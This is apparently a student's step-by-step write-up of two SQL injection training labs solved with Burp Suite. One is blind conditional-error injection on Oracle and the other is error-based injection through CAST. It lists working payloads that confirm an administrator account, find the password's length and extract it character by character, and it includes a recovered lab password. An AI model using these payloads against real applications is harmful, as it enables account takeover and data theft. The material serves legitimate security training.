**Step1**

Click on any categories

**Step2**

Send request in repeater as in previous labs.

**Step3.**

Adding single quote for testing

Adding double quote ' '

**Step4**

Here it is clear that it is interpreting it as a query

So we try with

By using `'||(SELECT '' FROM DUAL)||'`  this statement it contain DUAL keyword it is clear that the user use oracle database.

Because by replacing Dual with table name it gives error.

**Step5**

Now we try to retrieve rowone from usertable

`'|| (SELECT '' FROM USER WHERE ROWNUM=1)||'`

Returning more than one row will break concatenation

**Step6**

Now we try

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

Here we have error because if condition is execute.

Now we try

`'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

**Step7**

Confirming the user administrator is present

`'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Or use

`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Then the out should give error

**Step8**

Finding length of password

`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

To find the exact length we use intruder select.

Select the 1

`'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Payload setting

From the result it is clear that password length is 20 because we get okay response after 200

**Step9**

Now we find password for each index

`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

This query is used to find password for first index if the result is error then we say the password is correct.

To find password for all index we user cluster bombattack in burpsuite.

And select the password index value and charater value for payload position.

Payload 1 setting

Payload2 setting

Password:8vo43nhqeatkzqu386ht

**Step 1:**

Click on any categories as in previous lab

**Step2:**

Send the response of the request to repeater.

**Step3**

Add single quote and se result '

We see error In response and  we have

Now when we replace `'` with` '-- `the error remove

**Step4:**

Now we add generic query

`' AND CAST((SELECT 1) AS int)--`

We have response

So we use

`' AND 1=CAST((SELECT 1) AS int)--`

**Step5:**

`' AND 1=CAST((SELECT username FROM users) AS int)--`

In response we have error message

So we remove tracking id

We have response

**Step 6**

As it return more then I row we restrict it to 1

`' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`

Response

So we extract password using

`' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

In response we have
